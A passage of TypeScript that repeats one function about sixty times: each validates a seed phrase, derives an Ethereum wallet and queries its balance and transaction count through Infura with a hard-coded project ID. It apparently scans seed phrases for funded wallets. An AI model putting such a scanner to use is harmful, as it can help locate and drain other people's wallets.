    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s58(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s59(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s60(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s61(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s62(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s63(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s64(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s65(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s66(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s67(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s68(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s69(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s70(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s71(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s72(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s73(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s74(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s75(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s76(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s77(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s78(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s79(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s80(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s81(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s82(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s83(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s84(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s85(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s86(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s87(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s88(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s89(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s90(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s91(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s92(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s93(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s94(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s95(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s96(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s97(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s98(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s99(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s100(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s101(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s102(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s103(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s104(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s105(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s106(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s107(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s108(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s109(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s110(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s111(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s112(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s113(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s114(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s115(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s116(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s117(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s118(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
